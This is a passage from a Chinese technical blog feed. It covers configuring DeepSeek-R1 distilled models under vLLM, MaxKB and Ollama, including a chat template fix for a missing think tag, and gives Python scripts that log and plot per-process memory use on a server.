&#125;    ],    &quot;max_tokens&quot;:128  &#125;&#39;</code></pre><h2 id="接入MaxKB"><a href="#接入MaxKB" class="headerlink" title="接入MaxKB"></a>接入MaxKB</h2><p>MaxKB部署参考<a href="https://maxkb.cn/docs/">官方文档</a></p><p>根据<code>config.json</code>配置文件中<code>&quot;openAiSupport&quot;</code>字段确认接口方式，此处为 <code>&quot;vllm&quot;</code><br>选择vllm<br><img src="/images/2025/03/12/c890a1db-7597-4730-8097-23caca57312b.png"></p><p>输入<code>&quot;modelName&quot; : &quot;DeepSeek-R1-Distill-Llama-70B&quot;,</code>设置的模型名称，输入url，apikey随便填，然后保存使用即可。</p><p><img src="/images/2025/03/12/e4bf5af9-82b9-4c71-bc58-c803bd1d955a.png"></p><h2 id="奇怪的问题"><a href="#奇怪的问题" class="headerlink" title="奇怪的问题"></a>奇怪的问题</h2><h4 id="DeepSeek输出时前标签丢失，在输出时只有"><a href="#DeepSeek输出时前标签丢失，在输出时只有" class="headerlink" title="DeepSeek输出时前&lt;think&gt;标签丢失，在输出时只有&lt;/think&gt;"></a>DeepSeek输出时前<code>&lt;think&gt;</code>标签丢失，在输出时只有<code>&lt;/think&gt;</code></h4><p><img src="/images/2025/03/12/3a8a5747-53fa-4a89-9891-7c56f19d9a2f.png"><br>已知为BUG，需修改下载模型中的<code>tokenizer_config.json</code>，参考<a href="https://github.com/vllm-project/vllm/issues/13125">Issue-13125</a><br><code>tokenizer_config.json</code>:</p><pre class="language-none"><code class="language-none">&#123;  &quot;add_bos_token&quot;: true,  &quot;add_eos_token&quot;: false,  &quot;bos_token&quot;: &#123;    &quot;__type&quot;: &quot;AddedToken&quot;,    &quot;content&quot;: &quot;&lt;｜begin▁of▁sentence｜&gt;&quot;,    &quot;lstrip&quot;: false,    &quot;normalized&quot;: true,    &quot;rstrip&quot;: false,    &quot;single_word&quot;: false  &#125;,  &quot;clean_up_tokenization_spaces&quot;: false,  &quot;eos_token&quot;: &#123;    &quot;__type&quot;: &quot;AddedToken&quot;,    &quot;content&quot;: &quot;&lt;｜end▁of▁sentence｜&gt;&quot;,    &quot;lstrip&quot;: false,    &quot;normalized&quot;: true,    &quot;rstrip&quot;: false,    &quot;single_word&quot;: false  &#125;,  &quot;legacy&quot;: true,  &quot;model_max_length&quot;: 16384,  &quot;pad_token&quot;: &#123;    &quot;__type&quot;: &quot;AddedToken&quot;,    &quot;content&quot;: &quot;&lt;｜end▁of▁sentence｜&gt;&quot;,    &quot;lstrip&quot;: false,    &quot;normalized&quot;: true,    &quot;rstrip&quot;: false,    &quot;single_word&quot;: false  &#125;,  &quot;sp_model_kwargs&quot;: &#123;&#125;,  &quot;unk_token&quot;: null,  &quot;tokenizer_class&quot;: &quot;LlamaTokenizerFast&quot;,  &quot;chat_template&quot;: &quot;&#123;% if not add_generation_prompt is defined %&#125;&#123;% set add_generation_prompt &#x3D; false %&#125;&#123;% endif %&#125;&#123;% set ns &#x3D; namespace(is_first&#x3D;false, is_tool&#x3D;false, is_output_first&#x3D;true, system_prompt&#x3D;&#39;&#39;) %&#125;&#123;%- for message in messages %&#125;&#123;%- if message[&#39;role&#39;] &#x3D;&#x3D; &#39;system&#39; %&#125;&#123;% set ns.system_prompt &#x3D; message[&#39;content&#39;] %&#125;&#123;%- endif %&#125;&#123;%- endfor %&#125;&#123;&#123;bos_token&#125;&#125;&#123;&#123;ns.system_prompt&#125;&#125;&#123;%- for message in messages %&#125;&#123;%- if message[&#39;role&#39;] &#x3D;&#x3D; &#39;user&#39; %&#125;&#123;%- set ns.is_tool &#x3D; false -%&#125;&#123;&#123;&#39;&lt;｜User｜&gt;&#39; + message[&#39;content&#39;]&#125;&#125;&#123;%- endif %&#125;&#123;%- if message[&#39;role&#39;] &#x3D;&#x3D; &#39;assistant&#39; and message[&#39;content&#39;] is none %&#125;&#123;%- set ns.is_tool &#x3D; false -%&#125;&#123;%- for tool in message[&#39;tool_calls&#39;]%&#125;&#123;%- if not ns.is_first %&#125;&#123;&#123;&#39;&lt;｜Assistant｜&gt;&lt;｜tool▁calls▁begin｜&gt;&lt;｜tool▁call▁begin｜&gt;&#39; + tool[&#39;type&#39;] + &#39;&lt;｜tool▁sep｜&gt;&#39; + tool[&#39;function&#39;][&#39;name&#39;] + &#39;\\n&#39; + &#39;&#96;&#96;&#96;json&#39; + &#39;\\n&#39; + tool[&#39;function&#39;][&#39;arguments&#39;] + &#39;\\n&#39; + &#39;&#96;&#96;&#96;&#39; + &#39;&lt;｜tool▁call▁end｜&gt;&#39;&#125;&#125;&#123;%- set ns.is_first &#x3D; true -%&#125;&#123;%- else %&#125;&#123;&#123;&#39;\\n&#39; + &#39;&lt;｜tool▁call▁begin｜&gt;&#39; + tool[&#39;type&#39;] + &#39;&lt;｜tool▁sep｜&gt;&#39; + tool[&#39;function&#39;][&#39;name&#39;] + &#39;\\n&#39; + &#39;&#96;&#96;&#96;json&#39; + &#39;\\n&#39; + tool[&#39;function&#39;][&#39;arguments&#39;] + &#39;\\n&#39; + &#39;&#96;&#96;&#96;&#39; + &#39;&lt;｜tool▁call▁end｜&gt;&#39;&#125;&#125;&#123;&#123;&#39;&lt;｜tool▁calls▁end｜&gt;&lt;｜end▁of▁sentence｜&gt;&#39;&#125;&#125;&#123;%- endif %&#125;&#123;%- endfor %&#125;&#123;%- endif %&#125;&#123;%- if message[&#39;role&#39;] &#x3D;&#x3D; &#39;assistant&#39; and message[&#39;content&#39;] is not none %&#125;&#123;%- if ns.is_tool %&#125;&#123;&#123;&#39;&lt;｜tool▁outputs▁end｜&gt;&#39; + message[&#39;content&#39;] + &#39;&lt;｜end▁of▁sentence｜&gt;&#39;&#125;&#125;&#123;%- set ns.is_tool &#x3D; false -%&#125;&#123;%- else %&#125;&#123;% set content &#x3D; message[&#39;content&#39;] %&#125;&#123;% if &#39;&lt;&#x2F;think&gt;&#39; in content %&#125;&#123;% set content &#x3D; content.split(&#39;&lt;&#x2F;think&gt;&#39;)[-1] %&#125;&#123;% endif %&#125;&#123;&#123;&#39;&lt;｜Assistant｜&gt;&#39; + content + &#39;&lt;｜end▁of▁sentence｜&gt;&#39;&#125;&#125;&#123;%- endif %&#125;&#123;%- endif %&#125;&#123;%- if message[&#39;role&#39;] &#x3D;&#x3D; &#39;tool&#39; %&#125;&#123;%- set ns.is_tool &#x3D; true -%&#125;&#123;%- if ns.is_output_first %&#125;&#123;&#123;&#39;&lt;｜tool▁outputs▁begin｜&gt;&lt;｜tool▁output▁begin｜&gt;&#39; + message[&#39;content&#39;] + &#39;&lt;｜tool▁output▁end｜&gt;&#39;&#125;&#125;&#123;%- set ns.is_output_first &#x3D; false %&#125;&#123;%- else %&#125;&#123;&#123;&#39;\\n&lt;｜tool▁output▁begin｜&gt;&#39; + message[&#39;content&#39;] + &#39;&lt;｜tool▁output▁end｜&gt;&#39;&#125;&#125;&#123;%- endif %&#125;&#123;%- endif %&#125;&#123;%- endfor -%&#125;&#123;% if ns.is_tool %&#125;&#123;&#123;&#39;&lt;｜tool▁outputs▁end｜&gt;&#39;&#125;&#125;&#123;% endif %&#125;&#123;% if add_generation_prompt and not ns.is_tool %&#125;&#123;&#123;&#39;&lt;｜Assistant｜&gt;&#39;&#125;&#125;&#123;% endif %&#125;&quot;&#125;</code></pre><h4 id="ollma丢失"><a href="#ollma丢失" class="headerlink" title="ollma丢失&lt;think&gt;"></a>ollma丢失<code>&lt;think&gt;</code></h4><p>参考<a href="https://github.com/ollama/ollama/issues/8965">Issue-8965</a>，注意核对模型</p><pre class="language-none"><code class="language-none">FROM &quot;jp_calibration&#x2F;DeepSeek-R1-Distill-Qwen-32B-Q5_K_S-jp.gguf&quot;PARAMETER stop &quot;&lt;｜begin▁of▁sentence｜&gt;&quot;PARAMETER stop &quot;&lt;｜end▁of▁sentence｜&gt;&quot;PARAMETER stop &quot;&lt;｜User｜&gt;&quot;PARAMETER stop &quot;&lt;｜Assistant｜&gt;&quot;PARAMETER temperature 0.5PARAMETER top_k 40PARAMETER top_p 0.95PARAMETER repeat_penalty 1.1PARAMETER repeat_last_n 64SYSTEM &quot;&quot;&quot;The user asks a question, and the Assistant solves it. The assistant first thinks about the reasoning process in the mind and then provides the user with the answer.The reasoning process and answer are enclosed within &lt;think&gt; &lt;&#x2F;think&gt; and &lt;answer&gt; &lt;&#x2F;answer&gt; tags, respectively, i.e., &lt;think&gt; reasoning process here &lt;&#x2F;think&gt; &lt;answer&gt; answer here &lt;&#x2F;answer&gt;If the user&#39;s question is math related, please put your final answer within \\boxed&#123;&#123;&#125;&#125;.&quot;&quot;&quot;TEMPLATE &quot;&quot;&quot;&#123;&#123;- if .System &#125;&#125;&#123;&#123; .System &#125;&#125;&#123;&#123; end &#125;&#125;&#123;&#123;- range $i, $_ :&#x3D; .Messages &#125;&#125;&#123;&#123;- $last :&#x3D; eq (len (slice $.Messages $i)) 1&#125;&#125;&#123;&#123;- if eq .Role &quot;user&quot; &#125;&#125;&lt;｜User｜&gt;&#123;&#123; .Content &#125;&#125;&#123;&#123;- else if eq .Role &quot;assistant&quot; &#125;&#125;&lt;｜Assistant｜&gt;&#123;&#123; .Content &#125;&#125;&#123;&#123;- if not $last &#125;&#125;&lt;｜end▁of▁sentence｜&gt;&#123;&#123;- end &#125;&#125;&#123;&#123;- end &#125;&#125;&#123;&#123;- if and $last (ne .Role &quot;assistant&quot;) &#125;&#125;&lt;｜Assistant｜&gt;&#123;&#123;- end &#125;&#125;&#123;&#123;- end -&#125;&#125;&quot;&quot;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DeepSeek </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>监控服务器进程内存使用，绘制折线图</title>
      <link href="/2024/09/14/jian-kong-fu-wu-qi-jin-cheng-nei-cun-shi-yong-hui-zhi-zhe-xian-tu/"/>
      <url>/2024/09/14/jian-kong-fu-wu-qi-jin-cheng-nei-cun-shi-yong-hui-zhi-zhe-xian-tu/</url>
      
        <content type="html"><![CDATA[<p>排查问题自用小监控</p><span id="more"></span><h3 id="1、安装依赖"><a href="#1、安装依赖" class="headerlink" title="1、安装依赖"></a>1、安装依赖</h3><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> psutil matplotlib numpy</code></pre><h3 id="2、记录"><a href="#2、记录" class="headerlink" title="2、记录"></a>2、记录</h3><p>monitor.py记录每秒进程的内存使用情况取前20输出到monitor.log保存</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> python monitor.py <span class="token operator">></span> monitor.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span></code></pre><h3 id="3、绘制进程内存使用情况折线图"><a href="#3、绘制进程内存使用情况折线图" class="headerlink" title="3、绘制进程内存使用情况折线图"></a>3、绘制进程内存使用情况折线图</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python plot_memory_usage.py<span class="token number">1</span>: 最近30秒<span class="token number">2</span>: 最近1分钟<span class="token number">3</span>: 最近5分钟<span class="token number">4</span>: 最近30分钟<span class="token number">5</span>: 最近1小时<span class="token number">6</span>: 最近3小时<span class="token number">7</span>: 最近6小时<span class="token number">8</span>: 最近12小时<span class="token number">9</span>: 最近24小时<span class="token number">10</span>: 用户自选时间段请输入选项编号: <span class="token number">10</span>请输入时间范围 <span class="token punctuation">(</span>格式: YYYYMMDDHHMMSS-YYYYMMDDHHMMSS<span class="token punctuation">)</span>:</code></pre><p><img src="https://github.com/user-attachments/assets/5b770a36-fd75-4e30-a3eb-d0c0f721abe2" alt="memory_usage_python_492427_20240914113203_20240914143203"></p><h2 id="monitor-py"><a href="#monitor-py" class="headerlink" title="monitor.py"></a><code>monitor.py</code></h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> psutil<span class="token keyword">import</span> time<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">log_top_processes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    记录内存使用前20的进程的CPU、内存使用情况和可执行文件路径到控制台。    """</span>    <span class="token comment"># 获取当前时间</span>    current_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span>        <span class="token comment"># 打印时间戳到控制台</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"监控时间: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current_time<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"PID\tUSER\t%CPU\t%MEM\tCOMMAND\tFILE_PATH"</span><span class="token punctuation">)</span>    <span class="token comment"># 获取所有进程的信息</span>    processes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> proc <span class="token keyword">in</span> psutil<span class="token punctuation">.</span>process_iter<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">,</span> <span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'cpu_percent'</span><span class="token punctuation">,</span> <span class="token string">'memory_percent'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'exe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            processes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>info<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>psutil<span class="token punctuation">.</span>NoSuchProcess<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>AccessDenied<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>ZombieProcess<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token comment"># 按内存使用情况排序，取前20名</span>    top_processes <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>processes<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> p<span class="token punctuation">:</span> p<span class="token punctuation">[</span><span class="token string">'memory_percent'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>    <span class="token comment"># 将进程信息打印到控制台</span>    <span class="token keyword">for</span> proc <span class="token keyword">in</span> top_processes<span class="token punctuation">:</span>        pid <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        cpu <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'cpu_percent'</span><span class="token punctuation">]</span>        mem <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'memory_percent'</span><span class="token punctuation">]</span>        command <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>        file_path <span class="token operator">=</span> proc<span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token punctuation">]</span> <span class="token keyword">if</span> proc<span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token punctuation">]</span> <span class="token keyword">else</span> <span class="token string">"N/A"</span>  <span class="token comment"># 如果无法访问文件路径，则使用 "N/A"</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">&#125;</span></span><span class="token string">\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cpu<span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string">\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mem<span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string">\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">monitor_processes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    持续监控进程并每秒记录数据。    """</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        log_top_processes<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    monitor_processes<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="plot-memory-usage-py"><a href="#plot-memory-usage-py" class="headerlink" title="plot_memory_usage.py"></a><code>plot_memory_usage.py</code></h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>font_manager <span class="token keyword">as</span> fm<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>dates <span class="token keyword">as</span> mdates<span class="token keyword">import</span> datetime<span class="token keyword">import</span> os<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 手动添加字体路径</span>font_path <span class="token operator">=</span> <span class="token string">'/usr/share/fonts/truetype/simhei/SimHei.ttf'</span>font_prop <span class="token operator">=</span> fm<span class="token punctuation">.</span>FontProperties<span class="token punctuation">(</span>fname<span class="token operator">=</span>font_path<span class="token punctuation">)</span><span class="token comment"># 设置 Matplotlib 字体以支持中文</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 解决负号显示问题</span><span class="token comment"># 日志文件</span>log_file <span class="token operator">=</span> <span class="token string">"check.log"</span>img_dir <span class="token operator">=</span> <span class="token string">"img"</span><span class="token comment"># 创建图像保存目录（如果不存在）</span><span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>img_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>img_dir<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_log_data</span><span class="token punctuation">(</span>start_time<span class="token punctuation">,</span> end_time<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    解析日志文件并返回指定时间段内的进程数据，按PID分类。    """</span>    processes <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>log_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        current_time <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"监控时间:"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                current_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"监控时间: "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> current_time <span class="token operator">&lt;</span> start_time <span class="token keyword">or</span> current_time <span class="token operator">></span> end_time<span class="token punctuation">:</span>                    current_time <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">elif</span> current_time <span class="token keyword">and</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"PID"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                parts <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>                pid <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                user <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                cpu <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                mem <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                command <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>                file_path <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parts<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token keyword">else</span> <span class="token string">"N/A"</span>                <span class="token keyword">if</span> pid <span class="token keyword">not</span> <span class="token keyword">in</span> processes<span class="token punctuation">:</span>                    processes<span class="token punctuation">[</span>pid<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'timestamps'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'memory_usage'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'command'</span><span class="token punctuation">:</span> command<span class="token punctuation">,</span> <span class="token string">'file_path'</span><span class="token punctuation">:</span> file_path<span class="token punctuation">&#125;</span>                                processes<span class="token punctuation">[</span>pid<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'timestamps'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_time<span class="token punctuation">)</span>                processes<span class="token punctuation">[</span>pid<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'memory_usage'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>mem<span class="token punctuation">)</span>    <span class="token keyword">return</span> processes<span class="token keyword">def</span> <span class="token function">filter_data</span><span class="token punctuation">(</span>timestamps<span class="token punctuation">,</span> memory_usages<span class="token punctuation">,</span> max_points<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    过滤内存使用情况数据，只在未变化时保留起始和结束点，在变化时智能选取采样点。    """</span>    <span class="token comment"># 如果内存使用没有变化，只保留起始和结束点</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>memory_usages<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>timestamps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timestamps<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>memory_usages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> memory_usages<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token comment"># 如果内存使用发生变化，执行智能采样</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>timestamps<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> max_points<span class="token punctuation">:</span>        <span class="token keyword">return</span> timestamps<span class="token punctuation">,</span> memory_usages    <span class="token comment"># 初步筛选内存使用变化的点和起止点</span>    filtered_timestamps <span class="token operator">=</span> <span class="token punctuation">[</span>timestamps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    filtered_memory_usages <span class="token operator">=</span> <span class="token punctuation">[</span>memory_usages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>memory_usages<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> memory_usages<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> memory_usages<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> memory_usages<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> memory_usages<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            filtered_timestamps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>timestamps<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            filtered_memory_usages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>memory_usages<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    filtered_timestamps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>timestamps<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    filtered_memory_usages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>memory_usages<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># 如果过滤后的点数仍然超过限制，则进行智能采样</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">)</span> <span class="token operator">></span> max_points<span class="token punctuation">:</span>        interval <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">)</span> <span class="token operator">//</span> max_points        sampled_timestamps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        sampled_memory_usages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">)</span><span class="token punctuation">,</span> interval<span class="token punctuation">)</span><span class="token punctuation">:</span>            end <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>i <span class="token operator">+</span> interval<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">)</span><span class="token punctuation">)</span>            segment <span class="token operator">=</span> filtered_memory_usages<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span>            max_index <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>segment<span class="token punctuation">)</span>            sampled_timestamps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>filtered_timestamps<span class="token punctuation">[</span>i <span class="token operator">+</span> max_index<span class="token punctuation">]</span><span class="token punctuation">)</span>            sampled_memory_usages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>filtered_memory_usages<span class="token punctuation">[</span>i <span class="token operator">+</span> max_index<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> sampled_timestamps<span class="token punctuation">,</span> sampled_memory_usages        <span class="token keyword">return</span> filtered_timestamps<span class="token punctuation">,</span> filtered_memory_usages<span class="token keyword">def</span> <span class="token function">plot_memory_usage</span><span class="token punctuation">(</span>processes<span class="token punctuation">,</span> title<span class="token punctuation">,</span> start_time<span class="token punctuation">,</span> end_time<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    绘制内存使用情况的折线图，每个PID单独生成图表。    """</span>    <span class="token keyword">for</span> pid<span class="token punctuation">,</span> data <span class="token keyword">in</span> processes<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span 